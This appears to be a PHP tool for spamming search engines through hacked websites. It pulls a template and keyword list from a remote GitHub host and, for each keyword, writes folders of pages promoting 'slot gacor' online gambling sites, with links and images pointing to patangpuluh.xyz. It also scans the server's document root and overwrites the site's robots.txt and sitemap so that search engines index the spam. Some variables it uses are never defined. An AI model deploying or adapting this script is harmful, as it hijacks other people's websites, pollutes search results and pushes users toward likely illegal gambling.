<?php
// Pengaturan
$templateFile ='https://raw.githubusercontent.com/zeroxipinder/cpy/refs/heads/main/lp.html'; // tanpa random lp jika LP cuma satu
$sitemapFile ='mape.xml'; // Nama file sitemap
$robotsTxtFile ='robots.txt'; // Nama file robots.txt
$keywordFile ='https://raw.githubusercontent.com/zeroxipinder/cpy/refs/heads/main/kw.txt'; // Nama file keyword


$generateSitemap = true; // Opsi untuk menghasilkan sitemap
$generateRobotsTxt = true; // Opsi untuk menghasilkan robots.txt
$generatePerFolder = false; // Opsi untuk menghasilkan sitemap dan robots.txt per folder atau hanya di direktori root
$generateGoogleVerification = false; // Opsi untuk menghasilkan file verifikasi Google
$enableParaphrase = false; // Opsi untuk mengaktifkan atau menonaktifkan parafrase

$outputFormat = 'html'; // Format output file: html atau php
$formatRefferal = ''; // Format refferal tanpa refferal hanya domain utama # domainrefferal.com/brand

// Daftar parafrase
$paraphrases = array(
    // ------------------------------------slot----------------------------------------------------------
);


function generateRandomFileName() {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';  
    $randomString = '';
    $length = 10; // panjang nama file acak

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}

function paraphraseContent($content, $paraphrases) {
    $anchorPattern = '/<a\b([^>]*)>(.*?)<\/a>/i';

    // Menyimpan anchor yang ditemukan
    $anchors = [];
    preg_match_all($anchorPattern, $content, $anchors);

    foreach ($paraphrases as $keyword => $synonyms) {
        if (isset($synonyms) && is_array($synonyms) && count($synonyms) > 0) {
            $pattern = '/(?<!\w)' . $keyword . '(?!\w)/iu';
            $replacement = ucwords($synonyms[array_rand($synonyms)]);

            $content = preg_replace($pattern, $replacement, $content);
        }
    }

    // Mengubah anchor menjadi huruf kecil semua
    foreach ($anchors[0] as $i => $anchor) {
        $lowercaseAnchor = preg_replace_callback('/<a\b([^>]*)>/i', function ($matches) {
            $match = strtolower($matches[0]);
            return $match;
        }, $anchor);
        $content = str_replace($anchors[0][$i], $lowercaseAnchor, $content);
    }

    return $content;
}

function generateHTMLFile($keyword, $templateFile, $generatePerFolder, $generateRobotsTxt, $generateSitemap, $generateGoogleVerification, $robotsTxtFile, $sitemapFile, $googleVerificationFile, $outputFormat, $enableParaphrase, $paraphrases, $keepImageInRoot, $gambarFormat, $formatRefferal)
{
    $outputFolder = str_replace(' ', '&', $keyword);

    // Ubah keyword menjadi huruf kapital
    $title = ucwords($keyword);
    //
    // Baca template file
    // Ambil konten template file
    $templateContent = file_get_contents($templateFile);
        if ($templateContent === false) {
                echo 'Template file tidak ditemukan atau tidak dapat diakses.';
            exit;
        }


// Fungsi untuk menyusuri direktori secara rekursif dan menyusun semua jalur
function scanDirectories($dir, &$results = array()) {
    // Memeriksa apakah direktori ada dan dapat diakses
    if (!is_dir($dir)) {
        return []; // Jika bukan direktori, kembalikan array kosong
    }

    $files = scandir($dir); // Mengambil daftar file dalam direktori

    foreach ($files as $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value); // Mengambil jalur absolut
        if ($value != "." && $value != ".." && is_dir($path)) {
            $results[] = $path; // Menambahkan jalur direktori ke hasil
            scanDirectories($path, $results); // Rekursif untuk subdirektori
        }
    }
    return $results; // Kembalikan hasil
}

// Mendapatkan URL root saat ini
$currentDomain = 'https://' . $_SERVER['HTTP_HOST'];

// Mengambil direktori root dari server
$rootDir = $_SERVER['DOCUMENT_ROOT'];

// Memindai direktori
$directories = scanDirectories($rootDir);

// Memeriksa apakah direktori ditemukan
if (!empty($directories)) {
    // Memilih direktori secara acak dari hasil pemindaian
    $randomDir = $directories[array_rand($directories)];

    // Menghapus bagian root folder dari jalur direktori acak untuk mendapatkan jalur relatif
    $relativeDir = str_replace($_SERVER['DOCUMENT_ROOT'], '', $randomDir);

    // Menggabungkan dengan domain root untuk menghasilkan URL lengkap
    $currentURL = $currentDomain . $relativeDir;

    // Menampilkan URL yang dihasilkan
    echo "Random Directory URL: " . $currentURL;
} else {
    echo "Tidak ada direktori ditemukan.";
}


    $amp = 'https://patangpuluh.xyz/?daftar=' . $keyword;
    // Ganti #domain dengan direktori saat ini dan nama folder yang dibuat
    $templateContent = str_replace('#domain', $currentURL  . $outputFolder . '/', $templateContent); //tak ganti nggo bahan lp lain domen
    $templateContent = str_replace('#amp', $amp, $templateContent);
    
    // Replace variable #refferal dengan $formatRefferal
    if ($formatRefferal) {
        $templateContent = str_replace('#reff', $formatRefferal . $keyword, $templateContent);
    }

// Ganti variabel $gambarBrand dengan nama keyword yang dibuat


    // Gunakan URL gambar brand atau gambar default dalam konten template
    // $templateContent = str_replace('gambar_brand', $gambarBrand, $templateContent);
    
    // Daftar judul dengan penggunaan variabel $title yang telah diubah
    $brandse = $keyword;
    // Daftar judul dengan penggunaan variabel $title yang telah diubah
    $judulList = [
        "{$brandse} ✨ Alternatif Link Situs Slot Gacor Maxwin Asli Gampang Menang Hari Ini",
];
    
    $randomJudul = $judulList[array_rand($judulList)];
    // Ganti #judul dengan judul acak yang dihasilkan
    $templateContent = str_replace('#judul', $randomJudul, $templateContent);
    //isi artikel
    $artikelList = [
        "adalah link situs layanan informedia yang menawarkan solusi slot gacor terbaik. Situs ini dikenal sebagai situs gacor paling Maxwin dan terpercaya di tahun 2024, dengan peluang kemenangan tinggi dan permainan yang mudah jackpot. Tepat untuk para pemain yang mencari pengalaman slot online berkualitas dengan hasil yang memuaskan.",
];
    // ganti artikel
    $randomartikel = $artikelList[array_rand($artikelList)];
    $deslist = [
        "{$brandse} merupakan sebuah situs game slot online gacor hari ini terbaru dengan konsep slot88 resmi yang menyediakan permainan gampang menang maxwin tanpa pola",
];
    // ganti artikel
    $rdes = $deslist[array_rand($deslist)];                                 
    $templateContent = str_replace('#isi', $randomartikel, $templateContent);                                 
    $templateContent = str_replace('#des', $rdes, $templateContent);
    $rootimg = "https://patangpuluh.xyz/img/";
    $imageName = rand(1, 1796) . ".png"; // Menghasilkan nama gambar acak
$gmbr = $rootimg . $imageName; // Menggabungkan dengan rootimg untuk membuat URL lengkap

// Menampilkan URL gambar untuk debugging (opsional)
echo "Generated Image URL: " . $gmbr; 

$templateContent = str_replace('#gambare', $gmbr, $templateContent); // Mengganti placeholder dalam template

    // Ganti #kw dengan keyword yang telah diubah menjadi huruf kapital
    $templateContent = str_replace('#kw', $title, $templateContent);
    
    // Lakukan hal-hal lain yang diperlukan...


    // Spin isi dalam tag <p>, <h1>, dan <h2> jika opsi enableParaphrase diaktifkan
    if ($enableParaphrase) {
        $templateContent = paraphraseContent($templateContent, $paraphrases);
    }

    // Mengubah anchor dan canonical menjadi huruf kecil
    $templateContent = preg_replace_callback('/<(a|canonical)\b([^>]*)>/i', function ($matches) {
        return '<' . strtolower($matches[1]) . $matches[2] . '>';
    }, $templateContent);

    // Buat folder jika belum ada
    if (!file_exists($outputFolder)) {
        mkdir($outputFolder);
    }

    // Tulis konten template ke file index.html atau index.php dalam folder
    $outputFile = $outputFolder . '/index.' . $outputFormat;

    file_put_contents($outputFile, $templateContent);
    echo 'Folder dan file berhasil dibuat: ' . $outputFile;

    // Generate robots.txt dan sitemap.xml di dalam folder jika opsi generatePerFolder diaktifkan
    if ($generatePerFolder) {
        // Generate robots.txt
        if ($generateRobotsTxt) {
            $robotsTxtContent = "User-agent: *" . PHP_EOL;
            $robotsTxtContent .= "Allow: /" . PHP_EOL;
            $robotsTxtContent .= "Sitemap: " . $currentURL . '/' . $outputFolder . '/' . $sitemapFile . PHP_EOL;

            file_put_contents($outputFolder . '/robots.txt', $robotsTxtContent);
            echo 'File robots.txt berhasil dibuat: ' . $outputFolder . '/robots.txt';
        }

        // Generate sitemap.xml
        if ($generateSitemap) {
            
            $sitemapContent = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
            $sitemapContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;

            $currentURL1 = "https://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
            $outputFolder1 = str_replace(' ', '-', $keyword);
            $sitemapContent .= "\t<url>" . PHP_EOL;
            $sitemapContent .= "\t\t<loc>" . $currentURL1 . '/' . $outputFolder1 . '/</loc>' . PHP_EOL;
            $sitemapContent .= "\t\t<lastmod>" . date("Y-m-d\TH:i:sP") . '</lastmod>' . PHP_EOL;
            $sitemapContent .= "\t\t<changefreq>daily</changefreq>" . PHP_EOL;
            $sitemapContent .= "\t\t<priority>1.0</priority>" . PHP_EOL;
            $sitemapContent .= "\t</url>" . PHP_EOL;


            $sitemapContent .= '</urlset>';

            file_put_contents($outputFolder . '/' . $sitemapFile, $sitemapContent);
            echo 'File sitemap.xml berhasil dibuat: ' . $outputFolder . '/' . $sitemapFile;
        }

        // Copy file verifikasi Google jika opsi generateGoogleVerification diaktifkan
        if ($generateGoogleVerification) {
            copy($googleVerificationFile, $outputFolder . '/' . basename($googleVerificationFile));
            echo 'File verifikasi Google berhasil disalin: ' . $outputFolder . '/' . basename($googleVerificationFile);
        }

        // Copy file gambar brand jika generatePerFolder diaktifkan
        if ($keepImageInRoot) {
            copy($gambarBrand, $outputFolder . '/' . $gambarBrand);
            echo 'File gambar brand berhasil disalin ke folder: ' . $outputFolder . '/' . $gambarBrand;
        } else {
            copy($gambarBrand, $gambarBrand);
            echo 'File gambar brand berhasil disalin ke root: ' . $gambarBrand;
        }
    } else {
        // Copy file gambar brand ke root jika keepImageInRoot bernilai true
        if ($keepImageInRoot) {
            copy($gambarBrand, $gambarBrand);
            echo 'File gambar brand berhasil disalin ke root: ' . $gambarBrand;
        }
    }
}

// Baca file keyword.txt untuk mendapatkan daftar keyword
$keywords = [];

// Ambil konten dari URL
$content = file_get_contents($keywordFile);

if ($content !== false) {
    // Mengubah isi menjadi array berdasarkan newline
    $keywords = explode(PHP_EOL, trim($content));
} else {
    echo 'File keyword tidak ditemukan atau tidak dapat diakses.';
    exit;
}

// Generate HTML file, robots.txt, dan sitemap.xml untuk setiap keyword
foreach ($keywords as $keyword) {
    generateHTMLFile($keyword, $templateFile, $generatePerFolder, $generateRobotsTxt, $generateSitemap, $generateGoogleVerification, $robotsTxtFile, $sitemapFile, $googleVerificationFile, $outputFormat, $enableParaphrase, $paraphrases, $keepImageInRoot, $gambarFormat, $formatRefferal);
}

// Generate sitemap.xml di direktori root jika opsi generatePerFolder adalah false
if ($generateSitemap && !$generatePerFolder) {
    $currentURL = "https://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $sitemapContent = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $sitemapContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;

    // Membaca keyword dan buat sitemap untuk setiap keyword
    foreach ($keywords as $keyword) {
        $folderName = str_replace(' ', '-', $keyword);
        $sitemapContent .= "\t<url>" . PHP_EOL;
        $sitemapContent .= "\t\t<loc>" . $currentURL . '/' . $folderName . '/</loc>' . PHP_EOL;
        $sitemapContent .= "\t\t<lastmod>" . date("Y-m-d\TH:i:sP") . '</lastmod>' . PHP_EOL;
        $sitemapContent .= "\t\t<changefreq>daily</changefreq>" . PHP_EOL;
        $sitemapContent .= "\t\t<priority>1.0</priority>" . PHP_EOL;
        $sitemapContent .= "\t</url>" . PHP_EOL;
    }

    $sitemapContent .= '</urlset>';

    file_put_contents($sitemapFile, $sitemapContent);
    echo 'File sitemap.xml berhasil dibuat di direktori root: ' . $sitemapFile;
}


    // Generate robots.txt di direktori root jika opsi generatePerFolder adalah false
    if ($generateRobotsTxt) {
        $robotsTxtContent = "User-agent: *" . PHP_EOL;
        $robotsTxtContent .= "Allow: /" . PHP_EOL;
        $robotsTxtContent .= "Sitemap: " . $currentURL . '/' . basename($sitemapFile) . PHP_EOL;

        file_put_contents($robotsTxtFile, $robotsTxtContent);
        echo 'File robots.txt berhasil diperbarui di direktori root: ' . $robotsTxtFile;
    }

    // Copy file verifikasi Google jika opsi generateGoogleVerification diaktifkan
    if ($generateGoogleVerification) {
        copy($googleVerificationFile, $outputFolder . '/' . basename($googleVerificationFile));
        echo 'File verifikasi Google berhasil disalin ke direktori root: ' . $outputFolder . '/' . basename($googleVerificationFile);
    }

?>
